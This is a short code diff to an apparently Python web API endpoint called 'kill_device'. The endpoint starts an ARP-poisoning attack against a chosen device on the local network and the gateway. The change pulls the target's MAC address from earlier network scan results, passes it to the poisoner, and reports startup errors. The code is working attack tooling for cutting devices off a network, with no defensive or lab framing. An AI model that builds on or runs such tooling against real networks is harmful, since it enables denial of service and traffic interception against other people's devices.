@@ -225,8 +225,22 @@ async def kill_device(req: KillRequest):
     if attack_id in _state["active_attacks"]:
         return {"status": "already_running", "attack_id": attack_id}
 
-    poisoner = ARPPoisoner(target_ip=req.target_ip, gateway_ip=gateway)
+    # Find target MAC from scan results (avoids re-resolution failures)
+    target_mac = None
+    for dev in _state["devices"]:
+        if dev["ip"] == req.target_ip:
+            target_mac = dev["mac"]
+            break
+
+    poisoner = ARPPoisoner(target_ip=req.target_ip, gateway_ip=gateway, target_mac=target_mac)
     poisoner.start()
+
+    # Check for immediate errors (give it a moment to start)
+    import asyncio
+    await asyncio.sleep(0.5)
+    if poisoner.error:
+        add_log("error", poisoner.error)
+        return {"status": "error", "message": poisoner.error}
 
     _state["active_attacks"][attack_id] = {
         "type": "kill",
